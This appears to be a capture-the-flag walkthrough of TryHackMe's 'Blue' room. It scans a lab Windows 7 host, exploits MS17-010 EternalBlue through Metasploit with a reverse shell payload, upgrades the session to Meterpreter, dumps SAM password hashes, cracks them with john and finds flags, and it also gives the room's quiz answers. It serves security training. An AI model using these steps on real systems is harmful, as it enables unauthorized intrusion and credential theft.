## Blue

### Information
IP Address: 10.10.25.60
Important Note: This machine does not respond to ping (ICMP).

### Recon

Let us start with a simple nmap scan to check what services the target machine is hosting.

````
export ip=<TARGET IP>
nmap $ip
````

> PORT      STATE SERVICE      VERSION
> 135/tcp   open  msrpc        Microsoft Windows RPC
> 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
> 445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
> 49152/tcp open  msrpc        Microsoft Windows RPC
> 49153/tcp open  msrpc        Microsoft Windows RPC
> 49154/tcp open  msrpc        Microsoft Windows RPC
> 49158/tcp open  msrpc        Microsoft Windows RPC
> 49160/tcp open  msrpc        Microsoft Windows RPC
> MAC Address: 02:93:42:93:E8:D1 (Unknown)

**Question**: How many ports are open with a port number under 1000?

> 3

For our next step we would like to know if the machine is vulnerable to SMB vulnerabilities. To do this we have to perform an nmap scripted scan using a couple of scripts:

Nmap's scripts are located in /usr/share/nmap/scripts. Therefore if we perform a listing of scripts containing the *smb* keyword we can find a couple of interesting ones.

![image-20230119155631733](/home/kali/Desktop/pentest/Walkthroughs/Machines/THM/Blue/images/image-20230119155631733.png)

Since all of the scripts we are searching for (hinted by THM) start with smb-vuln-ms* we can run them using the syntax below.

`nmap $ip -p 445 --script=smb-vuln-ms*`

> Host script results:
> |_smb-vuln-ms10-054: false
> |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
> | smb-vuln-ms17-010: 
> |   VULNERABLE:
> |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
> |     State: VULNERABLE
> |     IDs:  CVE:CVE-2017-0143
> |     Risk factor: HIGH
> |       A critical remote code execution vulnerability exists in Microsoft SMBv1
> |        servers (ms17-010).
> |           
> |     Disclosure date: 2017-03-14
> |     References:
> |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
> |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
> |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

**Question**: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

> ms17-010

### Gain Access

Great! The next step is to launch Metasploit and search for an exploit that leverages this vulnerability.

```
msfconsole
search ms17-010
```

> 0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

We get a couple of results, 2 auxiliary modules which we are not interested in and 3 exploits.

Let us try and use the first result.

```
use 0
or 
use exploit/windows/smb/ms17_010_eternalblue
```

We can already answer the next question which provides us a lead that we are going in the right direction.

**Question** Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

> exploit/windows/smb/ms17_010_eternalblue

Our next step is going to be configuring the exploit so that we can successfully get a shell on the target.

Note: We could easily get a meterpreter shell right away on the target using the default payload (windows/x64/meterpreter/reverse_tcp). However for educational purposes we are going to get a standard shell and afterwards use a module to upgrade from a regular shell to a meterpreter one, thus following the path THM provided.

```
set rhosts <TARGET IP>

#Staged Payload vs Stageless Payload
set payload windows/x64/shell_reverse_tcp
or
set payload windows/x64/shell/reverse_tcp

set lhost <LOCAL IP>
exploit
```

> Additional Notes:
>
> Some exploits allow us to check if the target machine is vulnerable running `check` after configuring the exploit options.
>
> If at any moment you want to:
>
> 1. Get information about the exploit run `info`
> 2. List options, payload and target configuration run `show options`
> 3. Search for a specific payload (ex: windows x64 shell) run `search payload/windows/x64/shell`
>
> For more information regarding staged vs stageless payloads [consult this link](https://buffered.io/posts/staged-vs-stageless-handlers/).

If everything was performed correctly you now have a shell on the Windows target machine. 

### Escalate

Before moving forward, there let us try to upgrade our shell to a Meterpreter one, using the the module *shell_to_meterpreter*.

In order to do this, first we need to background our current session using:

```
CTRL+Z
or
background
or
bg
```

> Additional Notes:
>
> To list our current sessions: `sessions`
>
> To foreground a backgrounded session: `sessions <id>`
>
> To kill a session: `sessions -k <id>`

Let us search for this module:

```
search shell_to_meterpreter

use 0
or
use post/multi/manage/shell_to_meterpreter                   
```

Now we just have to configure this module just like we have done previously:

```
show options
set lhost <LOCAL IP>
sessions (in order to get the session id we just backgrounded)
set session <session id we want to upgrade>
exploit
```

Once again if everything was properly configured we successfully upgraded our shell to a Meterpreter one and we can answer the following questions.

**Question** If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

> post/multi/manage/shell_to_meterpreter



**Question** Select this (use MODULE_PATH). Show options, what option are we required to change?

> SESSION



For this next step, I verified that I already was NT AUTHORITY\SYSTEM using `getuid` on the Meterpreter shell, but nonetheless we can try to escalate our privileges using the `getsystem` Meterpreter command.

```
getuid 					#NT AUTHORITY\SYSTEM
getsystem
getuid 					#NT AUTHORITY\SYSTEM
```

> Additional Information:
>
> Inside a Meterpreter session we can downgrade to a DOS shell by typing the command `shell`.

Great! For our next step we can use `hashdump` to extract the users + password hashes stored in the SAM database. Just like the /etc/passwd and /etc/shadow files in Linux. In order to do this we have to migrate our shell process into another active process running as NT AUTHORITY\SYSTEM.

Note: Migrating processes can kill our connection, so if that happens just run the module again and try with a different process.

```
ps
migrate <pid>
hashdump
```

Now we have access to the different users and their password hashes!



### Cracking

We can see three different users and their hashes were dumped. Two default users and one non-default one.

**Question** What is the name of the non-default user? 

> Jon

Now that we have the password hash (right-most string) we can try to crack this password using `john`.

In order to to this correctly, we need 3 things:

1. The password hash
2. Wordlist to crack the password
3. The correct hash format

We already have requirement number one, so let's work on the other two.

Regarding a wordlist we can use rockyou.txt which is a common and potent database with unique and common passwords.

Finally, we know that SAM stores passwords in its database using LAN Manager (LN) hash or New Technology LAN Manager (NTLM) hash format. 

> Additional information:
>
> We can we two different tools to identify the hash format
>
> ```
> hashid (comes with kali)
> or
> hash-identifier (comes with kali)
> 
> 
> # Can be downloaded and executed using
> wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
> python3 hash-id.py
> ```

Finally, we can crack the password after storing the hash in a file and using the following command:

```
echo <hash> > crack.hash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt crack.hash
```

**Question** Copy this password hash to a file and research how to crack it. What is the cracked password?

> <Redacted>

### Find Flags

Great! All that is left to do is search for the three flag. I'll show you two ways you can do this.

#### Flag 1

*This flag can be found at the system root.*

This refers to the path `C:\`  in Windows or `/` in Linux systems.

Therefore we can access the flag using:

```
cd /
ls -la
cat flag1.txt
```



#### Flag 2

*This flag can be found at the location where passwords are stored within Windows.*

Windows passwords are stored in `C:\windows\system32\config` folder (the SAM file is in here).

```
cd /windows/system32/config
ls -la
cat flag2.txt
```



#### Flag 3

*This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.*

This hints us that the flag must be inside the Users folder of an Administrator. We can help our search using the following command since we already know what the final flag's name will be.

```
search /users/jon -f flag3.txt
```

> Found 1 result...
>     c:\Users\Jon\Documents\flag3.txt (37 bytes)



```
cat /users/jon/Documents/flag3.txt
```



#### Alternative Method

As we have seen with the last example we can just search for all files starting from the root directory which start with the name flag.

Note: This would require knowing full or partially the name/extension of the file and can take a bit of time since it is recursively searching all folders of the machine. 

```
search / -f flag*
```

> Found 6 results...
>     c:\flag1.txt (24 bytes)
>     c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
>     c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
>     c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
>     c:\Users\Jon\Documents\flag3.txt (37 bytes)
>     c:\Windows\System32\config\flag2.txt (34 bytes)



Great! You have successfully completed the Blue Machine!
